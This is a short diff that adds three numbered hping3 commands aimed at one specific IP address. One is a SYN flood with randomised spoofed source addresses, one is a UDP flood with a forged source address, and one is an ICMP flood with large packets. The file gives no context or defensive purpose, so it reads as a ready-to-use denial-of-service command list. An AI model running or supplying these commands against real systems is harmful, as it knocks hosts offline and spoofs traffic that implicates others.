@@ -1,0 +1,5 @@
+1. sudo hping3 -c 10000 -S --flood --rand-source 147.182.144.203
+
+2. sudo hping3 -c 9000 --udp -i u10000 -a 13.13.13.13 147.182.144.203
+
+3. sudo hping3 -c 11000 --icmp -d 1024 -i u13333 147.182.144.203
